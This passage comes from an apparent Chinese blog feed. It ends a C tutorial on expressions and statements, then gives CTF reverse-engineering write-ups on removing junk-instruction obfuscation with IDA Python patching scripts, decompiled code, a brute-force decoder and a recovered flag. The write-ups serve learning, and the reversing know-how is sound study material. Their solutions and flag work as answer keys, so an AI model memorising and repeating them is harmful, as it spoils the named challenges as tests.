        <content type="html"><![CDATA[<p>我们前面已经学习了C语言最基本的数据存储,学习了如何使用<code>变量</code>和<code>常量</code>.</p><p>为了后面的知识:三种流程控制等,我们有必要现在就引入表达式和语句的概念.</p><p>这里简单甚至可能不准确的概括一下主要信息:</p><p>表达式由<code>运算</code>构成,<code>常见情况下</code>,如果在一个表达式后面添加一个<code>分号;</code>,则他成为一条语句.</p><h1 id="表达式">表达式</h1><h2 id="什么是表达式">什么是表达式</h2><p>cppreference标准定义为:<code>表达式是运算符及其操作数的序列，它指定一个运算.</code></p><p>所谓运算符,就是类似<code>+-*/</code>这样的符号,他可能有多个字符组成,C语言中有许多运算符,用于实现各种运算.</p><p>所谓操作数,就是运算符的运算对象,例如<code>1+2</code>中的<code>1</code>和<code>2</code>即为<code>+</code>的操作数.</p><p>C中的大部分语句都是表达式语句(见后面讲解<code>语句</code>的部分),所以<code>表达式</code>是C语言不可或缺的组成部分.大到一个函数调用,小到一个常量,都可以称为表达式,想要理解表达式,就要知道表达式有哪些.</p><p>实际上,我们之前见过的各种赋值,四则运算的操作,都属于表达式!</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162451089.png" alt=""></p><h2 id="表达式有哪些">表达式有哪些</h2><h3 id="初等表达式">初等表达式</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923161056185.png" alt="image-20230923161056185"></p><p>上图为C标准的描述,实际上已经比较清楚(真的假的???)</p><p>那么说人话就是,你平时见到的数字,字符,或者各种单个的标识符(例如变量n,函数名printf),都是初等表达式.</p><p>这&quot;人话&quot;说的可能还有点不清楚,举几个例子就好:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">3</span>,b=<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure><p>3~8行这些都是合法的初等表达式</p><p>另一方面,例如在<code>1+2*3</code>中,<code>2*3</code>作为其子表达式,<code>1</code>作为初等表达式,也是其子表达式,更近一步,<code>2*3</code>中,<code>2</code>和<code>3</code>都是初等表达式</p><h3 id="不求值表达式">不求值表达式</h3><p>sizeof运算符的操作数是不求值表达式（除非它们是 VLA — 各位暂时不必理会）.sizeof运算符用于查询对象或类型的大小.</p><p>更新的标准C11中新增的内容有:<a href="https://zh.cppreference.com/w/c/language/_Alignof"><code>_Alignof</code>运算符</a>的操作数、<a href="https://zh.cppreference.com/w/c/language/generic">泛型选择</a>的控制表达式及作为 <code>_Alignof</code> 的操作数的 VLA 的大小表达式亦为不求值的表达式.</p><p>其实很显然,这些由初等表达式和各种运算符组合起来的序列都是表达式,标准称:它指定一个运算(我们再把图放一遍)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162451089.png" alt="image-20230923162451089"></p><p>不仅仅是用于计算算术运算的序列是表达式,其他的特殊运算(例如复合赋值,逻辑运算,关系运算,成员访问,函数调用)都能组成表达式.</p><p>换句话说,我们说<code>学习C语言的大部分过程实际上就是学习如何正确编写合适的表达式用于计算</code>也不为过.</p><p>此外关于这些其他运算和运算符等的知识,将在后面进行讲解.</p><p>​—WAHAHA,2023.9.23</p><h1 id="语句">语句</h1><h2 id="什么是语句">什么是语句</h2><p>以下根据<code>cppreference</code>的相关定义进行讲解.</p><p>c语言中,程序的基本单位是函数,而在每一个函数中(或者说一个过程),每一步运行的都是语句.</p><p>换句话说,<code>语句是按顺序执行的 C 程序段。任何函数体都是一条复合语句，继而为语句或声明的序列</code>,例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; <span class="comment">// 复合语句的开始</span></span><br><span class="line">    <span class="type">int</span> n = <span class="number">1</span>; <span class="comment">// 声明（非语句）</span></span><br><span class="line">    n = n+<span class="number">1</span>; <span class="comment">// 表达式语句</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n = %d\n&quot;</span>, n); <span class="comment">// 表达式语句</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回语句</span></span><br><span class="line">&#125; <span class="comment">// 复合语句之结尾，函数体之结尾</span></span><br></pre></td></tr></table></figure><h2 id="语句的分类">语句的分类</h2><p>首先必须要说明的一点是,下面的概念是相对严谨的描述(我根据cppreference进行描述),如果不理解不要紧,后面会进行穿插讲解,其实重要一点的就是要知道什么地方需要加<code>;</code>什么地方不需要加.</p><p>语句有五种类型：</p><ol><li><p>复合语句</p><p>或称块语句,由一对{}括起来,是花括号所包围的语句与声明的序列.</p><p>复合语句允许将一组声明和语句组合入一个单元，并将其在任何期待单个语句的场所使用(例如在 <a href="https://zh.cppreference.com/w/c/language/if">if</a> 语句或循环语句中)—换句话说,一个复合语句中的所有语句将被视为一个整体的大语句进行使用.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (expr) <span class="comment">// if 语句的开始</span></span><br><span class="line">&#123; <span class="comment">// 开始块</span></span><br><span class="line">  <span class="type">int</span> n = <span class="number">1</span>; <span class="comment">// 声明</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n); <span class="comment">// 表达式语句</span></span><br><span class="line">&#125; <span class="comment">// 块结尾， if 语句结尾</span></span><br></pre></td></tr></table></figure><p>此外,一个复合语句内,会引入其自身的块作用域,此时块内部的变量将屏蔽外部同名的变量,有关<code>作用域</code>的知识将在后面进行讲解.</p></li><li><p>表达式语句</p><p><code>跟随分号的表达式</code>是一条语句.</p><p>无表达式的语句叫做<code>空语句</code>,空语句很重要,在后面讲解循环时会使用到.</p><p>典型的 C 程序中大多数语句是表达式语句，例如<code>赋值</code>或<code>函数调用</code>—例如前面说过的printf()的函数调用表达式.</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>); <span class="comment">// 表达式语句</span></span><br><span class="line"><span class="type">char</span> *s;</span><br><span class="line"><span class="keyword">while</span> (*s++ != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    ; <span class="comment">// 空语句</span></span><br></pre></td></tr></table></figure></li><li><p>选择语句</p><p>选择语句根据表达式的值，选择数条语句之一执行—后面会讲解到的选择执行.</p></li><li><p>循环语句</p><p>循环语句重复执行一条语句,注意,这里将复合语句视为一条语句!</p><p>后面会讲解到的循环执行.</p></li><li><p>跳转语句</p><p>跳转语句无条件地转移控制流.</p><p>这里其实算是C保留了一点汇编的影子,C允许使用goto进行跳转.</p><p>跳转语句也有几种:</p><ol><li><a href="https://zh.cppreference.com/w/c/language/break">break</a> 语句</li><li><a href="https://zh.cppreference.com/w/c/language/continue">continue</a> 语句</li><li><a href="https://zh.cppreference.com/w/c/language/return">return</a> 语句带可选的表达式</li><li><a href="https://zh.cppreference.com/w/c/language/goto">goto</a> 语句</li></ol><p>这些语句将在后面讲解其他执行顺序时进行讲解,放在顺序执行里为时过早.</p></li></ol><p align=right>---WAHAHA 2023.10.13</p><br><br><p>上一篇:<a href="../2023427f4611cc41/">C语言教程-3_2-基本输入输出</a></p><p>下一篇:<a href="../202322bfbdadd502">C语言教程-5-顺序执行</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令题型</title>
      <link href="/20230f806397af20/"/>
      <url>/20230f806397af20/</url>
      
        <content type="html"><![CDATA[<h1 id="gfctf-2021wordy"><a href="https://www.ctfer.vip/problem/880">[GFCTF] 2021wordy</a></h1><p>2023.9.23</p><p>本题关键是用脚本解决一系列的花指令(数量过多需要使用<code>IDA Python</code>来写脚本)</p><p>发现程序中有花指令jmp,将其patch为nop(0x90):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start_adr = <span class="number">0x1151</span></span><br><span class="line">end_adr = <span class="number">0x3100</span></span><br><span class="line"><span class="comment"># 因为尝试patch一个后发现后面有大批量的花指令,所以编写脚本</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_adr,end_adr):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i) == <span class="number">0xeb</span>:</span><br><span class="line">        <span class="keyword">if</span> get_wide_byte(i+<span class="number">1</span>) == <span class="number">0xff</span>:</span><br><span class="line">            patch_byte(i,<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure><p>然后发现是一系列putchar(),同样写脚本将输出的字符提取出来:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start_adr = <span class="number">0x1151</span></span><br><span class="line">end_adr = <span class="number">0x3100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_adr,end_adr):</span><br><span class="line">    <span class="keyword">if</span> get_wide_byte(i) == <span class="number">0xc0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(get_wide_byte(i+<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ello world!</span><br><span class="line">There are moments in life when you miss someone so much that you just want to pick them from your dreams and hug them for real! Dream what you want to dream;go where you want to go;be what you want to be,becÿause you have only one life and one chance to do all the things you want to do.</span><br><span class="line">May you have enough happiness to make you sweet,enough trials to make you strong,enough sorrow to keep you human,enough hope to make you happy? Always put yourself in others&#x27;shÿoes.If you feel that it hurts you,it probably hurts the other person, too.</span><br><span class="line"></span><br><span class="line">GFÿCTF&#123;u_are2wordy&#125;</span><br><span class="line">You find Flag, Congratulation!</span><br><span class="line">You didn&#x27;t find Flag</span><br></pre></td></tr></table></figure><h1 id="hznuctf-2023-final-虽然他送了我玫瑰花"><a href="https://www.ctfer.vip/problem/3595">[HZNUCTF 2023 final]虽然他送了我玫瑰花</a></h1><p>2023.9.28</p><h2 id="花指令patch">花指令patch</h2><p>本题的main函数有一处(还是两处;来着)花指令,同样把jz+jnz后面的脏字节patch为<code>0x90</code>,即nop指令;</p><p>然后在nop处按快捷键c识别为代码;</p><p>最后光标指示到main函数的开头,按快捷键p重新生成函数,看到(可能?)生成了一些变量的初始化代码后说明成功,此时就可以正常生成main函数的C伪代码了.</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142524335.png" alt="image-20230928142524335"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142642131.png" alt="image-20230928142642131"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142712825.png" alt="image-20230928142712825"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142801458.png" alt="image-20230928142801458"></p><p>最后记得patch后要同步保存一下,这里不知道IDA怎么搞的,反正我为了防止出问题,先从patch菜单中点击保存到输入文件(原来的文件):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928142930135.png" alt="image-20230928142930135" style="zoom:33%;" /><p>然后保存,最后重启IDA:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143027704.png" alt="image-20230928143027704" style="zoom:33%;" /><p>这样就完成了.</p><p>最终的main伪代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+0h] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+0h] [ebp-F8h]</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">100</span>]; <span class="comment">// [esp+Ch] [ebp-ECh]</span></span><br><span class="line">  __int128 v9; <span class="comment">// [esp+70h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+80h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+84h] [ebp-74h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+88h] [ebp-70h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+8Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> Arglist[<span class="number">100</span>]; <span class="comment">// [esp+90h] [ebp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401020((<span class="type">char</span> *)&amp;Format, v6);</span><br><span class="line">  sub_401050(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Arglist);</span><br><span class="line">  v10 = <span class="number">-171171450</span>;</span><br><span class="line">  v11 = <span class="number">-669748952</span>;</span><br><span class="line">  v12 = <span class="number">1651994351</span>;</span><br><span class="line">  v13 = <span class="number">-6</span>;</span><br><span class="line">  v9 = xmmword_402170;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Arglist) == <span class="number">29</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">      v8[i] = funcs_40117E[i % <span class="number">5u</span>](Arglist[i]);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v8[v4] == *((_BYTE *)&amp;v9 + v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 &gt;= <span class="number">29</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401020(<span class="string">&quot;Congratulations!!\n&quot;</span>, v7);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_401020(<span class="string">&quot;try again\n&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_401020(<span class="string">&quot;wwwhhhaaattt???\n&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析代码">分析代码</h2><p>很容易知道flag长度为29,我们构造一个长29的字符串备用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">29</span>;++i)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="comment">//aaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们从伪代码中发现这段关键代码,使用了一个函数指针数组对每一位进行不同的加密变换:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">      v8[i] = funcs_40117E[i % <span class="number">5u</span>](Arglist[i]);</span><br></pre></td></tr></table></figure><p>由于只有5个函数,我们直接把他们提取出来—点击<code>funcs_40117E</code>到内存,跳转到对应的五个函数,稍加修改备用:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143211657.png" alt="image-20230928143211657"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f0</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f0\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 ^ <span class="number">0x19</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f1</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f1\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 + <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f2</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f2\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 - <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f3</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f3\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * (a1 &amp; <span class="number">0x7F</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f4</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="comment">//printf(&quot;call f4\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span> a1 ^ ((<span class="type">unsigned</span> <span class="type">char</span>)a1 ^ (<span class="type">unsigned</span> <span class="type">char</span>)~(<span class="type">unsigned</span> <span class="type">char</span>)a1) &amp; <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> (*func_p[<span class="number">5</span>])(<span class="type">int</span> a1) = &#123;</span><br><span class="line">f0, f1, f2, f3, f4</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候就只剩下提取出v9对应的数组(IDA分析将其错误分析成一个__int128,三个int和一个char的组合了)中的加密后的flag了,我们动态调试,然后用<code>IDA Python</code>提取29个字节,这里多提取了几次,最后提取出来的没有<code>0x0</code>的才是正确的(虽然我不知道怎么回事).</p><p>貌似要在正式开始和v9比较时数据才写回内存(?)总之把断点位置从22行<code>if ( strlen(Arglist) == 29 )</code>放到后面27行的<code>while ( v8[v4] == *((_BYTE *)&amp;v9 + v4) )</code>才最后成功.</p><p>这也意味着我们动调是需要输入正确的长为29的字符串,我们已经生成好了.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143705669.png" alt="image-20230928143705669" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143717471.png" alt="image-20230928143717471" style="zoom:50%;" /><p>我们双击v9,找到其地址,写脚本导出即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928143825128.png" alt="image-20230928143825128"></p><p>脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adr=<span class="number">0x0036FD68</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    temp=get_bytes(adr+i,<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(temp,byteorder=<span class="string">&#x27;little&#x27;</span>)),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(temp,end=&#x27;,&#x27;)*/</span></span><br></pre></td></tr></table></figure><p>最后把提取出来的数据进行爆破解密即可:</p><p>爆破脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f0</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 ^ <span class="number">0x19</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f1</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 + <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f2</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 - <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f3</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * (a1 &amp; <span class="number">0x7F</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">f4</span><span class="params">(<span class="type">int</span> a1)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a1 ^ ((<span class="type">unsigned</span> <span class="type">char</span>)a1 ^ (<span class="type">unsigned</span> <span class="type">char</span>)~(<span class="type">unsigned</span> <span class="type">char</span>)a1) &amp; <span class="number">0x80</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> str1[] = &#123;</span><br><span class="line"><span class="number">0x7f</span>, <span class="number">0x7e</span>, <span class="number">0x51</span>, <span class="number">0xce</span>, <span class="number">0xfb</span>, <span class="number">0x4e</span>, <span class="number">0x7a</span>, <span class="number">0x24</span>, <span class="number">0xe8</span>, <span class="number">0xdf</span>, <span class="number">0x59</span>, <span class="number">0x71</span>, <span class="number">0x26</span>, <span class="number">0xca</span>, <span class="number">0xe1</span>, <span class="number">0x6c</span>, <span class="number">0x86</span>, <span class="number">0x21</span>, <span class="number">0xcc</span>, <span class="number">0xf5</span>, <span class="number">0x28</span>, <span class="number">0x71</span>, <span class="number">0x14</span>, <span class="number">0xd8</span>, <span class="number">0xef</span>, <span class="number">0x6e</span>, <span class="number">0x77</span>, <span class="number">0x62</span>, <span class="number">0xfa</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// printf(&quot;%d&quot;,sizeof(str1) / sizeof(str1[0]));</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*func_p[<span class="number">5</span>])(<span class="type">int</span> a1) = &#123;</span><br><span class="line">f0, f1, f2, f3, f4</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">32</span>; c &lt;= <span class="number">126</span>; ++c) &#123;</span><br><span class="line"><span class="keyword">if</span> (func_p[i % <span class="number">5</span>](c) == str1[i]) &#123;</span><br><span class="line"><span class="built_in">putchar</span>(c);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">adr=0x00EFFA1C</span></span><br><span class="line"><span class="comment">for i in range(29):</span></span><br><span class="line"><span class="comment">    temp=get_bytes(adr+i,1)</span></span><br><span class="line"><span class="comment">    print(hex(int.from_bytes(temp,byteorder=&#x27;little&#x27;)),end=&#x27;,&#x27;)</span></span><br><span class="line"><span class="comment">    #print(temp,end=&#x27;,&#x27;)*/</span></span><br></pre></td></tr></table></figure><p>最终结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928144001030.png" alt="image-20230928144001030" style="zoom:50%;" /><p>结束…</p><h1 id="nssround-3-team-jump-by-jump">NSSRound#3 Team]jump_by_jump</h1><p>直接将jz和jnz下面识别出的call指令的首字节E8修改成90(nop指令),然后将后面转换出来的数据重新分析成指令,然后最后在main的开头重新生成函数即可还原函数伪代码.</p><p>问题:我的IDA莫名其妙patch为nop后,新生成的数据无法分析为数据,来回辗转好机会才成功.<code>猜测可能是重新分析成代码时,选中的数据要包含有patch出来的nop.</code></p><p>patch掉脏字节↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014252908.png" alt="image-20230925014252908" style="zoom:45%;" /><p>选中包含nop在内的那堆数据,进行analyze,然后就会生成正确的汇编代码,此时在_main_0的开头重新生成函数即可↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014609287.png" alt="image-20230925014609287" style="zoom:55%;" /><p>修复完成,此时TAB键即可生成伪代码↓</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014215010.png" alt="image-20230925014215010" style="zoom: 50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230925014904236.png" alt="image-20230925014904236" style="zoom:45%;" 